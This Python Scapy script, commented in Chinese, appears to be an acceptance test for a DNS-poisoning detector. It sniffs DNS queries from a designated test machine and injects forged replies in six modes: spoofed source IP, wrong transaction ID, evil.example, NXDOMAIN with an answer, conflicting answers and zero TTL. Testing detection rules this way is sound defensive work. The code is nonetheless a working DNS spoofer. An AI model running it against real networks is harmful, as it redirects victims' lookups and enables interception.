#!/usr/bin/env python3
# 4.3 DNS 投毒精确验收（Kali / Scapy）
#
# 用途：
#   dnsspoof / ettercap 默认会把“被查询的 DNS 服务器 IP”作为伪造应答的源 IP，
#   因此通常只命中 dns_server_not_gateway（中危）和 dns_ttl_suspicious（低危）。
#   这个脚本用来精确触发 4 条高危规则和冲突 / TTL 规则。
#
# 依赖：
#   sudo apt install -y python3-scapy
#
# 用法：
#   sudo python3 4.3-DNS投毒验收.py <验收机IP> <模式>
#
#   mode:
#     unexpected  应答源 IP 故意不同于被查询服务器 → dns_response_unexpected_server（高）
#     txid        事务 ID 加 1                      → dns_transaction_mismatch（高）
#     name        应答 Question 换成 evil.example    → dns_answer_name_mismatch（高）
#     nxdomain    NXDOMAIN 却带 Answer              → dns_nxdomain_with_answer（高）
#     conflict    同一请求 0.3 秒内两个不同 A 答案   → dns_conflicting_answers（中）
#     ttl         TTL = 0                           → dns_ttl_suspicious（低）
#
# 验收机侧触发（不要改系统 DNS）：
#   ipconfig /flushdns
#   nslookup <域名> <Kali-IP>
#
# 说明：
#   - 每个模式用不同域名，避免 10 分钟冷却吞掉同规则第二次告警。
#   - 非 unexpected 模式会把源 IP 设为“查询原本发往的服务器”，
#     这样只命中目标规则；unexpected 模式才故意换源 IP。
#   - 通常还会同时命中 dns_server_not_gateway（中危），因为回包 MAC 是 Kali。

import sys
import time

from scapy.all import (
    DNS,
    DNSQR,
    DNSRR,
    Ether,
    IP,
    UDP,
    get_if_hwaddr,
    getmacbyip,
    sendp,
    sniff,
)

IFACE = "eth0"
FAKE_IP = "6.6.6.6"
UNEXPECTED_SRC = "1.1.1.1"

if len(sys.argv) < 2:
    print("用法: sudo python3 4.3-DNS投毒验收.py <验收机IP> [mode]")
    sys.exit(2)

VICTIM = sys.argv[1]
MODE = sys.argv[2] if len(sys.argv) > 2 else "unexpected"
ATTACKER_MAC = get_if_hwaddr(IFACE)
VICTIM_MAC = getmacbyip(VICTIM)

if not VICTIM_MAC:
    print(f"找不到 {VICTIM} 的 MAC，请先在验收机上 ping 一下 Kali")
    sys.exit(2)

VALID_MODES = {"unexpected", "txid", "name", "nxdomain", "conflict", "ttl"}

if MODE not in VALID_MODES:
    print("未知模式:", MODE)
    print("可用:", ", ".join(sorted(VALID_MODES)))
    sys.exit(2)


def send_reply(query, src_ip, dns_layer):
    packet = (
        Ether(src=ATTACKER_MAC, dst=VICTIM_MAC)
        / IP(src=src_ip, dst=VICTIM)
        / UDP(sport=53, dport=query[UDP].sport)
        / dns_layer
    )
    sendp(packet, iface=IFACE, verbose=False)


def handle(query):
    if IP not in query or UDP not in query or DNS not in query:
        return

    if query[IP].src != VICTIM or query[DNS].qr != 0:
        return

    question = query[DNS].qd

    if question is None:
        return

    # unexpected 模式故意换源 IP；其它模式保持“被查询服务器”的源 IP。
    src_ip = UNEXPECTED_SRC if MODE == "unexpected" else query[IP].dst
    txid = query[DNS].id

    if MODE == "unexpected":
        send_reply(
            query,
            src_ip,
            DNS(id=txid, qr=1, aa=1, rd=1, ra=1, qd=question,
                an=DNSRR(rrname=question.qname, ttl=300, rdata=FAKE_IP)),
        )

    elif MODE == "txid":
        send_reply(
            query,
            src_ip,
            DNS(id=(txid + 1) & 0xFFFF, qr=1, aa=1, rd=1, ra=1, qd=question,
                an=DNSRR(rrname=question.qname, ttl=300, rdata=FAKE_IP)),
        )

    elif MODE == "name":
        send_reply(
            query,
            src_ip,
            DNS(id=txid, qr=1, aa=1, rd=1, ra=1,
                qd=DNSQR(qname="evil.example"),
                an=DNSRR(rrname="evil.example", ttl=300, rdata=FAKE_IP)),
        )

    elif MODE == "nxdomain":
        send_reply(
            query,
            src_ip,
            DNS(id=txid, qr=1, aa=1, rd=1, ra=1, rcode=3, qd=question,
                an=DNSRR(rrname=question.qname, ttl=300, rdata=FAKE_IP)),
        )

    elif MODE == "conflict":
        send_reply(
            query,
            src_ip,
            DNS(id=txid, qr=1, aa=1, rd=1, ra=1, qd=question,
                an=DNSRR(rrname=question.qname, ttl=300, rdata=FAKE_IP)),
        )
        time.sleep(0.3)
        send_reply(
            query,
            src_ip,
            DNS(id=txid, qr=1, aa=1, rd=1, ra=1, qd=question,
                an=DNSRR(rrname=question.qname, ttl=300, rdata="7.7.7.7")),
        )

    elif MODE == "ttl":
        send_reply(
            query,
            src_ip,
            DNS(id=txid, qr=1, aa=1, rd=1, ra=1, qd=question,
                an=DNSRR(rrname=question.qname, ttl=0, rdata=FAKE_IP)),
        )

    print(f"{MODE} 已回包: {question.qname}")


print(f"监听 {IFACE}；验收机={VICTIM}；模式={MODE}；Kali MAC={ATTACKER_MAC}")
print("在验收机上执行: ipconfig /flushdns 后 nslookup <域名> <Kali-IP>")

sniff(iface=IFACE, filter=f"udp port 53 and src host {VICTIM}", prn=handle, store=0)
